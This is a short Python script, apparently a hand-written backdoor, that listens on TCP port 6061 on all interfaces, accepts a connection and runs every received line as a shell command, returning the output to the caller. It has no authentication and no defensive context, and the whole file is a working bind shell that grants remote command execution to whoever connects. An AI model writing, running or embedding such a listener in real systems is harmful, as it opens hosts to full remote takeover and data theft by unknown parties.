import  socket
import  subprocess
HOST=''
PORT=6061

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR ,1 );
s.bind((HOST,PORT))
s.listen()
conn,addr=s.accept();

print("{} Conection with Back Port {}  ".format(addr[0],addr[1]) )

while True :
    data = conn.recv(1024);
    if not data:
        break
    else:
        data =data.decode().strip()
        print("Echo > {} ".format(data))
        if data == "quit":
            break
        else:
            proc = subprocess.Popen(data,stdout=subprocess.PIPE,shell=True , stderr=subprocess.STDOUT)
            out,err=proc.communicate()
            data="============\n\nCmd :: > "+data +"\r\n"
            data=data+"Cmd Result :) \n"+ out.decode()
            data=data+"\n=====================\n\n"

            conn.sendall(data.encode());
s.close() 